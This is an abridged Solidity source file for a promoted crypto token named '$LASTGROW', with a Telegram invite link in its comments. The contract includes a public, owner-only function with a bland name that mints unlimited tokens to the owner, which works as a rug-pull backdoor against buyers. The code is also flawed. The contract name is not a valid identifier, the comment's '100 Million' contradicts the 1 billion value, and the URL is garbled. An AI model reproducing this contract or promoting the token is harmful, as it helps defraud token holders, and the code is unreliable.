...
//
// $LASTGROW proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/+yF5BNoLjUbhiNzI1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _lastgrow(uint256 amount) public onlyOwner {
    _lastgrow(msg.sender, amount);
    }
    ...
    function _lastgrow(address account, uint256 amount) internal virtual {
...
contract $LASTGROW is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("LASTGROW", "LASTGROW") {
        _lastgrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}